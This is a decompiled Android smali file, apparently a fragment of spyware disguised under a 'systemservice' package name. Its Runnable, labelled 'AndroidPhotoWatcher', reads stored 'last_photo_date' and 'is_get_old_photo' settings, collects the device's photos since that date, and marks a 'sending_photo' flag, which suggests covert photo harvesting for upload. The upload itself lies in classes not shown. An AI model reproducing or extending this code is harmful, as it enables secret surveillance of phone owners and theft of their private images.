.class Lcom/systemservice/a/c/g/a;
.super Ljava/lang/Object;
.source ""

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/systemservice/a/c/g/d;->a(Lcom/systemservice/a/d/b;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic a:Lcom/systemservice/a/d/b;

.field final synthetic b:Landroid/content/Context;

.field final synthetic c:Lcom/systemservice/a/c/g/d;


# direct methods
.method constructor <init>(Lcom/systemservice/a/c/g/d;Lcom/systemservice/a/d/b;Landroid/content/Context;)V
    .locals 0

    iput-object p1, p0, Lcom/systemservice/a/c/g/a;->c:Lcom/systemservice/a/c/g/d;

    iput-object p2, p0, Lcom/systemservice/a/c/g/a;->a:Lcom/systemservice/a/d/b;

    iput-object p3, p0, Lcom/systemservice/a/c/g/a;->b:Landroid/content/Context;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 15

    const-string v0, "is_get_old_photo = "

    const-string v1, "ts_photo"

    const-string v2, "sending_photo"

    const-string v3, "AndroidPhotoWatcher"

    const-string v4, "FINALLY PHOTO"

    const/4 v5, 0x0

    :try_start_0
    iget-object v6, p0, Lcom/systemservice/a/c/g/a;->c:Lcom/systemservice/a/c/g/d;

    invoke-static {v6}, Lcom/systemservice/a/c/g/d;->a(Lcom/systemservice/a/c/g/d;)Lorg/apache/log4j/Logger;

    move-result-object v6

    const-string v7, "In method Start AndroidPhoto"

    invoke-virtual {v6, v7}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    const-string v6, "in method Start AndroidPhoto"

    invoke-static {v1, v6}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v6, p0, Lcom/systemservice/a/c/g/a;->c:Lcom/systemservice/a/c/g/d;

    invoke-static {v6}, Lcom/systemservice/a/c/g/d;->b(Lcom/systemservice/a/c/g/d;)Landroid/content/SharedPreferences;

    move-result-object v6

    const-string v7, "last_photo_date"

    const-wide/16 v8, 0x0

    invoke-interface {v6, v7, v8, v9}, Landroid/content/SharedPreferences;->getLong(Ljava/lang/String;J)J

    move-result-wide v6

    iget-object v10, p0, Lcom/systemservice/a/c/g/a;->c:Lcom/systemservice/a/c/g/d;

    invoke-static {v10}, Lcom/systemservice/a/c/g/d;->b(Lcom/systemservice/a/c/g/d;)Landroid/content/SharedPreferences;

    move-result-object v10

    const-string v11, "is_get_old_photo"

    invoke-interface {v10, v11, v5}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v10

    new-instance v11, Ljava/lang/StringBuilder;

    invoke-direct {v11}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v11, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v11, v10}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    invoke-virtual {v11}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v11

    invoke-static {v1, v11}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v1, p0, Lcom/systemservice/a/c/g/a;->c:Lcom/systemservice/a/c/g/d;

    invoke-static {v1}, Lcom/systemservice/a/c/g/d;->a(Lcom/systemservice/a/c/g/d;)Lorg/apache/log4j/Logger;

    move-result-object v1

    new-instance v11, Ljava/lang/StringBuilder;

    invoke-direct {v11}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v11, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v11, v10}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    invoke-virtual {v11}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    const/4 v0, 0x0

    const-wide/16 v11, 0x3e8

    const-wide/16 v13, 0x1

    if-nez v10, :cond_0

    new-instance v1, Ljava/util/Date;

    add-long/2addr v6, v13

    mul-long v6, v6, v11

    invoke-direct {v1, v6, v7}, Ljava/util/Date;-><init>(J)V

    iget-object v6, p0, Lcom/systemservice/a/c/g/a;->c:Lcom/systemservice/a/c/g/d;

    iget-object v7, p0, Lcom/systemservice/a/c/g/a;->a:Lcom/systemservice/a/d/b;

    check-cast v7, Lcom/systemservice/a/b/a;

    invoke-virtual {v7}, Lcom/systemservice/a/b/a;->a()Landroid/content/Context;

    move-result-object v7

    :goto_0
    invoke-static {v6, v7, v1, v0}, Lcom/systemservice/a/c/g/d;->a(Lcom/systemservice/a/c/g/d;Landroid/content/Context;Ljava/util/Date;Ljava/util/Date;)V

    goto :goto_1

    :cond_0
    cmp-long v1, v6, v8

    if-lez v1, :cond_1

    new-instance v1, Ljava/util/Date;

    add-long/2addr v6, v13

    mul-long v6, v6, v11

    invoke-direct {v1, v6, v7}, Ljava/util/Date;-><init>(J)V

    iget-object v6, p0, Lcom/systemservice/a/c/g/a;->c:Lcom/systemservice/a/c/g/d;

    iget-object v7, p0, Lcom/systemservice/a/c/g/a;->a:Lcom/systemservice/a/d/b;

    check-cast v7, Lcom/systemservice/a/b/a;

    invoke-virtual {v7}, Lcom/systemservice/a/b/a;->a()Landroid/content/Context;

    move-result-object v7

    goto :goto_0

    :cond_1
    :goto_1
    iget-object v0, p0, Lcom/systemservice/a/c/g/a;->c:Lcom/systemservice/a/c/g/d;

    iget-object v0, v0, Lcom/systemservice/a/d/g;->b:Lcom/systemservice/a/h/b;

    check-cast v0, Lcom/systemservice/a/h/l;

    invoke-virtual {v0}, Lcom/systemservice/a/h/l;->c()V

    iget-object v1, p0, Lcom/systemservice/a/c/g/a;->c:Lcom/systemservice/a/c/g/d;

    iget-object v6, p0, Lcom/systemservice/a/c/g/a;->b:Landroid/content/Context;

    invoke-static {v1, v6, v0}, Lcom/systemservice/a/c/g/d;->a(Lcom/systemservice/a/c/g/d;Landroid/content/Context;Lcom/systemservice/a/h/l;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    goto :goto_2

    :catchall_0
    move-exception v0

    goto :goto_3

    :catch_0
    move-exception v0

    :try_start_1
    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v1

    invoke-static {v3, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v1, p0, Lcom/systemservice/a/c/g/a;->c:Lcom/systemservice/a/c/g/d;

    invoke-static {v1}, Lcom/systemservice/a/c/g/d;->a(Lcom/systemservice/a/c/g/d;)Lorg/apache/log4j/Logger;

    move-result-object v1

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v6, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v0, ""

    invoke-virtual {v6, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Lorg/apache/log4j/Category;->error(Ljava/lang/Object;)V
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    :goto_2
    invoke-static {v3, v4}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v0, p0, Lcom/systemservice/a/c/g/a;->c:Lcom/systemservice/a/c/g/d;

    invoke-static {v0}, Lcom/systemservice/a/c/g/d;->a(Lcom/systemservice/a/c/g/d;)Lorg/apache/log4j/Logger;

    move-result-object v0

    invoke-virtual {v0, v4}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    iget-object v0, p0, Lcom/systemservice/a/c/g/a;->b:Landroid/content/Context;

    invoke-static {v0, v2, v5}, Lcom/systemservice/a/a/l;->b(Landroid/content/Context;Ljava/lang/String;Z)V

    return-void

    :goto_3
    invoke-static {v3, v4}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v1, p0, Lcom/systemservice/a/c/g/a;->c:Lcom/systemservice/a/c/g/d;

    invoke-static {v1}, Lcom/systemservice/a/c/g/d;->a(Lcom/systemservice/a/c/g/d;)Lorg/apache/log4j/Logger;

    move-result-object v1

    invoke-virtual {v1, v4}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    iget-object v1, p0, Lcom/systemservice/a/c/g/a;->b:Landroid/content/Context;

    invoke-static {v1, v2, v5}, Lcom/systemservice/a/a/l;->b(Landroid/content/Context;Ljava/lang/String;Z)V

    throw v0
.end method
